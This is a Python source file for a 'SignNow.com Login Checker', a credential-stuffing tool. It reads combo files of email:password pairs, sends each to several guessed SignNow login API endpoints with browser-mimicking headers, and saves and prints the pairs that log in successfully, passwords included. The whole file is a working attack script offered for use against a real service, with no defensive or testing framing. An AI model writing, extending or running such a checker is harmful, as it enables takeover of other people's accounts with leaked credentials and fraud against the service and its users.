"""
SignNow.com Login Checker
Checks if email/password combinations are valid on SignNow.com
"""

import requests
import time
from typing import Tuple, Optional
import json
from datetime import datetime

class SignNowChecker:
    def __init__(self, delay: float = 1.0, timeout: int = 10):
        """
        Initialize SignNow checker
        
        Args:
            delay: Delay between requests in seconds (default: 1.0)
            timeout: Request timeout in seconds (default: 10)
        """
        self.delay = delay
        self.timeout = timeout
        self.session = requests.Session()
        
        # SignNow login endpoints (try multiple)
        self.login_urls = [
            "https://www.signnow.com/api/v1/users/login",
            "https://app.signnow.com/api/v1/users/login",
            "https://www.signnow.com/api/v2/users/login",
            "https://www.signnow.com/api/users/login",
        ]
        self.current_url_index = 0
        
        # Headers to mimic browser
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': 'https://www.signnow.com',
            'Referer': 'https://www.signnow.com/login',
            'X-Requested-With': 'XMLHttpRequest',
        }
        
        self.results = {
            'valid': [],
            'invalid': [],
            'errors': []
        }
    
    def check_credentials(self, email: str, password: str) -> Tuple[bool, Optional[str]]:
        """
        Check if credentials are valid
        
        Args:
            email: Email address
            password: Password
            
        Returns:
            Tuple of (is_valid, message)
        """
        # Try multiple endpoints if one fails
        for url_index, login_url in enumerate(self.login_urls):
            try:
                # Prepare login payload (try different formats)
                payloads = [
                    {'email': email, 'password': password},
                    {'username': email, 'password': password},
                    {'login': email, 'password': password},
                ]
                
                for payload in payloads:
                    try:
                        # Make login request
                        response = self.session.post(
                            login_url,
                            json=payload,
                            headers=self.headers,
                            timeout=self.timeout,
                            allow_redirects=False
                        )
                        
                        # Check response
                        if response.status_code == 200:
                            try:
                                data = response.json()
                                # Check if login was successful
                                if 'access_token' in data or 'token' in data or 'user' in data or 'id' in data:
                                    return True, "Valid credentials"
                                elif 'error' in data:
                                    error_msg = data.get('error', {}).get('message', 'Invalid credentials')
                                    return False, error_msg
                                else:
                                    # If we get 200 but no clear success indicator, might be valid
                                    return False, "Invalid credentials (unexpected response)"
                            except json.JSONDecodeError:
                                # If response is not JSON, check content
                                if response.status_code == 200 and len(response.text) > 0:
                                    return True, "Valid credentials (non-JSON response)"
                                else:
                                    return False, f"HTTP {response.status_code} (non-JSON)"
                        elif response.status_code == 401:
                            return False, "Invalid credentials (401 Unauthorized)"
                        elif response.status_code == 403:
                            return False, "Forbidden (403) - Account may be locked"
                        elif response.status_code == 404:
                            # Try next endpoint if 404
                            if url_index < len(self.login_urls) - 1:
                                continue  # Try next URL
                            return False, "API endpoint not found (404)"
                        elif response.status_code == 429:
                            return False, "Rate limited (429) - Too many requests"
                        else:
                            # For other status codes, try next endpoint if available
                            if url_index < len(self.login_urls) - 1 and response.status_code >= 500:
                                continue  # Try next URL for server errors
                            return False, f"HTTP {response.status_code}"
                    except requests.exceptions.RequestException:
                        # If this payload format fails, try next
                        continue
                
                # If all payload formats failed for this URL, try next URL
                if url_index < len(self.login_urls) - 1:
                    continue
                    
            except requests.exceptions.Timeout:
                if url_index < len(self.login_urls) - 1:
                    continue  # Try next URL
                return False, "Request timeout"
            except requests.exceptions.ConnectionError:
                if url_index < len(self.login_urls) - 1:
                    continue  # Try next URL
                return False, "Connection error"
            except Exception as e:
                if url_index < len(self.login_urls) - 1:
                    continue  # Try next URL
                return False, f"Error: {str(e)}"
        
        # If all endpoints failed
        return False, "All API endpoints failed"
    
    def check_from_file(self, filename: str, output_file: Optional[str] = None):
        """
        Check credentials from a combo file
        
        Args:
            filename: Path to combo.txt file (format: email:password or email|password)
            output_file: Optional path to save results
        """
        print(f"[*] Starting SignNow checker...")
        print(f"[*] Reading combos from: {filename}")
        print(f"[*] Delay between requests: {self.delay}s")
        print("-" * 60)
        
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            
            total = len(lines)
            print(f"[*] Found {total} combos to check\n")
            
            for idx, line in enumerate(lines, 1):
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                # Parse combo (support both : and | separators)
                if ':' in line:
                    parts = line.split(':', 1)
                elif '|' in line:
                    parts = line.split('|', 1)
                else:
                    print(f"[!] Skipping invalid format: {line}")
                    continue
                
                if len(parts) != 2:
                    print(f"[!] Skipping invalid format: {line}")
                    continue
                
                email = parts[0].strip()
                password = parts[1].strip()
                
                if not email or not password:
                    continue
                
                print(f"[{idx}/{total}] Checking: {email}")
                
                is_valid, message = self.check_credentials(email, password)
                
                if is_valid:
                    result = f"✓ VALID - {email}:{password} - {message}"
                    print(f"    {result}")
                    self.results['valid'].append({
                        'email': email,
                        'password': password,
                        'message': message,
                        'timestamp': datetime.now().isoformat()
                    })
                else:
                    result = f"✗ INVALID - {email} - {message}"
                    print(f"    {result}")
                    self.results['invalid'].append({
                        'email': email,
                        'message': message,
                        'timestamp': datetime.now().isoformat()
                    })
                
                # Save results incrementally
                if output_file:
                    self.save_results(output_file)
                
                # Delay between requests
                if idx < total:
                    time.sleep(self.delay)
            
            # Final summary
            print("\n" + "=" * 60)
            print("CHECK COMPLETE")
            print("=" * 60)
            print(f"Total checked: {total}")
            print(f"Valid: {len(self.results['valid'])}")
            print(f"Invalid: {len(self.results['invalid'])}")
            print(f"Errors: {len(self.results['errors'])}")
            
            if self.results['valid']:
                print("\n✓ VALID CREDENTIALS:")
                for result in self.results['valid']:
                    print(f"  {result['email']}:{result['password']}")
            
            # Save final results
            if output_file:
                self.save_results(output_file)
                print(f"\n[*] Results saved to: {output_file}")
            
        except FileNotFoundError:
            print(f"[!] Error: File '{filename}' not found")
        except Exception as e:
            print(f"[!] Error reading file: {e}")
    
    def save_results(self, filename: str):
        """Save results to JSON file"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"[!] Error saving results: {e}")


def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description='SignNow.com Login Checker')
    parser.add_argument('combo_file', help='Path to combo.txt file (format: email:password)')
    parser.add_argument('-d', '--delay', type=float, default=1.0, help='Delay between requests in seconds (default: 1.0)')
    parser.add_argument('-o', '--output', help='Output file for results (JSON format)')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout in seconds (default: 10)')
    
    args = parser.parse_args()
    
    # Create checker
    checker = SignNowChecker(delay=args.delay, timeout=args.timeout)
    
    # Set output file
    output_file = args.output or 'signnow_results.json'
    
    # Start checking
    checker.check_from_file(args.combo_file, output_file)


if __name__ == '__main__':
    main()

